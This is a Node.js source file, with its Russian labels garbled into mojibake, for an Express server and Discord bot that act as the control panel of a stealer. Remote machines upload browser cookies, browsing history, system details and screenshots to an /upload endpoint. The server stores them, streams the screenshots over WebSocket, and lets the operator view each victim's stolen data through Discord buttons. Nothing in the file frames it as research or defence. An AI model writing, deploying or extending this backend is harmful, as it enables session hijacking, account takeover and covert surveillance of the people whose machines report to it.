const express = require("express");
const { Client, GatewayIntentBits, Partials, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require("discord.js");
const bodyParser = require("body-parser");
const { WebSocketServer } = require("ws");

const DISCORD_BOT_TOKEN = process.env.DISCORD_BOT_TOKEN;
const GUILD_ID = process.env.GUILD_ID;
const CATEGORY_NAME = "–í—Å–µ –ü–ö";

const app = express();
app.use(bodyParser.json({ limit: "50mb" }));

// ---------- Discord ----------
const client = new Client({
  intents: [GatewayIntentBits.Guilds],
  partials: [Partials.Channel],
});

client.once("ready", () => {
  console.log(`–ë–æ—Ç –∑–∞–ø—É—â–µ–Ω –∫–∞–∫ ${client.user.tag}`);
});

// ---------- –•—Ä–∞–Ω–∏–ª–∏—â–µ ----------
let onlinePCs = {}; // { pcId: { lastSeen, cookies, history, systemInfo, screenshot } }

// ---------- –í–µ–±-—Å–æ–∫–µ—Ç—ã ----------
const wsClients = {};
const wss = new WebSocketServer({ noServer: true });

wss.on("connection", (ws, req) => {
  const urlParams = new URLSearchParams(req.url.replace("/?", ""));
  const pcId = urlParams.get("pcId");
  if (!pcId) return ws.close();

  if (!wsClients[pcId]) wsClients[pcId] = [];
  wsClients[pcId].push(ws);

  ws.on("close", () => {
    wsClients[pcId] = wsClients[pcId].filter(c => c !== ws);
  });
});

// ---------- Express + WS –∏–Ω—Ç–µ–≥—Ä–∞—Ü–∏—è ----------
const server = app.listen(process.env.PORT || 3000, () =>
  console.log("–°–µ—Ä–≤–µ—Ä –∑–∞–ø—É—â–µ–Ω")
);
server.on("upgrade", (req, socket, head) => {
  wss.handleUpgrade(req, socket, head, (ws) => {
    wss.emit("connection", ws, req);
  });
});

// ---------- –í—Å–ø–æ–º–æ–≥–∞—Ç–µ–ª—å–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏ ----------
async function getOrCreateCategory(name) {
  const guild = await client.guilds.fetch(GUILD_ID);
  let category = guild.channels.cache.find(c => c.name === name && c.type === 4);
  if (!category) {
    category = await guild.channels.create({
      name,
      type: 4,
    });
  }
  return category.id;
}

async function getOrCreateTextChannel(name, categoryId) {
  const guild = await client.guilds.fetch(GUILD_ID);
  let channel = guild.channels.cache.find(c => c.name === name && c.type === 0);
  if (!channel) {
    channel = await guild.channels.create({
      name,
      type: 0,
      parent: categoryId,
    });
  }
  return channel.id;
}

async function sendControlButtons(pcId) {
  const categoryId = await getOrCreateCategory(CATEGORY_NAME);
  const pcChannelId = await getOrCreateTextChannel(pcId, categoryId);
  const channel = await client.channels.fetch(pcChannelId);

  const row = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId(`check_${pcId}`).setLabel("–ß–µ–∫ –æ–Ω–ª–∞–π–Ω").setStyle(ButtonStyle.Success),
    new ButtonBuilder().setCustomId(`cookies_${pcId}`).setLabel("–ö—É–∫–∏").setStyle(ButtonStyle.Primary),
    new ButtonBuilder().setCustomId(`history_${pcId}`).setLabel("–ò—Å—Ç–æ—Ä–∏—è").setStyle(ButtonStyle.Primary),
    new ButtonBuilder().setCustomId(`system_${pcId}`).setLabel("–°–∏—Å—Ç–µ–º–∞").setStyle(ButtonStyle.Secondary),
    new ButtonBuilder().setCustomId(`screenshot_${pcId}`).setLabel("–°–∫—Ä–∏–Ω—à–æ—Ç").setStyle(ButtonStyle.Danger),
  );

  await channel.send({ content: `–£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –ü–ö: **${pcId}**`, components: [row] });
}

// ---------- REST API ----------
app.post("/upload", async (req, res) => {
  const { pcId, cookies, history, screenshot, systemInfo } = req.body;
  if (!pcId) return res.status(400).send("pcId –æ–±—è–∑–∞—Ç–µ–ª–µ–Ω");

  const isNewPC = !onlinePCs[pcId];
  onlinePCs[pcId] = {
    lastSeen: Date.now(),
    cookies: cookies || onlinePCs[pcId]?.cookies,
    history: history || onlinePCs[pcId]?.history,
    systemInfo: systemInfo || onlinePCs[pcId]?.systemInfo,
    screenshot: screenshot || onlinePCs[pcId]?.screenshot,
  };

  // —Ä–∞—Å—Å—ã–ª–∞–µ–º –∫–∞–¥—Ä —á–µ—Ä–µ–∑ WS
  if (screenshot && wsClients[pcId]) {
    wsClients[pcId].forEach(ws => {
      if (ws.readyState === 1) ws.send(screenshot);
    });
  }

  // —Ç–µ–ø–µ—Ä—å –∫–Ω–æ–ø–∫–∏ –æ—Ç–ø—Ä–∞–≤–ª—è—é—Ç—Å—è –≤—Å–µ–≥–¥–∞
  await sendControlButtons(pcId);

  res.send("OK");
});

// ---------- –ö–æ–º–∞–Ω–¥—ã Discord ----------
client.on("interactionCreate", async (interaction) => {
  if (!interaction.isButton()) return;

  const [action, pcId] = interaction.customId.split("_");
  const pcData = onlinePCs[pcId];

  if (!pcData) return interaction.reply({ content: "–ù–µ—Ç –¥–∞–Ω–Ω—ã—Ö –æ–± —ç—Ç–æ–º –ü–ö", ephemeral: true });

  if (action === "check") {
    const status = Date.now() - pcData.lastSeen < 15000 ? "üü¢ –û–Ω–ª–∞–π–Ω" : "üî¥ –û—Ñ—Ñ–ª–∞–π–Ω";
    return interaction.reply({ content: `–°—Ç–∞—Ç—É—Å ${pcId}: ${status}`, ephemeral: true });
  }
  if (action === "cookies") {
    return interaction.reply({ content: `Cookies: \`\`\`${pcData.cookies || "–ù–µ—Ç"}\`\`\``, ephemeral: true });
  }
  if (action === "history") {
    return interaction.reply({ content: `–ò—Å—Ç–æ—Ä–∏—è: \`\`\`${pcData.history || "–ù–µ—Ç"}\`\`\``, ephemeral: true });
  }
  if (action === "system") {
    return interaction.reply({ content: `–°–∏—Å—Ç–µ–º–∞: \`\`\`${JSON.stringify(pcData.systemInfo || {}, null, 2)}\`\`\``, ephemeral: true });
  }
  if (action === "screenshot") {
    if (!pcData.screenshot) return interaction.reply({ content: "–°–∫—Ä–∏–Ω—à–æ—Ç–∞ –Ω–µ—Ç", ephemeral: true });
    const buffer = Buffer.from(pcData.screenshot, "base64");
    return interaction.reply({ files: [{ attachment: buffer, name: `${pcId}.jpg` }], ephemeral: true });
  }
});

// ---------- –ó–∞–ø—É—Å–∫ ----------
client.login(DISCORD_BOT_TOKEN);
